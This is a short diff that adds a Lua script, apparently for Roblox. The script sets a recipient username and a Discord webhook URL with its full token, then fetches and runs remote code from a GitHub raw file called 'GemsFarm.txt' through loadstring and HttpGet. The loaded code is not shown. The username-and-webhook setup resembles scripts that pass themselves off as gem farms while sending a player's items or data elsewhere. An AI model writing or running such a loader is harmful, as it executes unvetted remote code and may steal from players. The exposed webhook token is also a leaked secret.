@@ -1,0 +1,4 @@
+_G.Username = "ov2w1"
+_G.Webhook = "https://discord.com/api/webhooks/1116963517828972564/1zYRP65g_XOVgmKVYbqlFLwKQxKHz-Q45tjJfvYzaYvnf9nzPvvg4eyRxB1P4C5Bn0fw"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/UnknownAny/dwddw/main/GemsFarm.txt", true))()
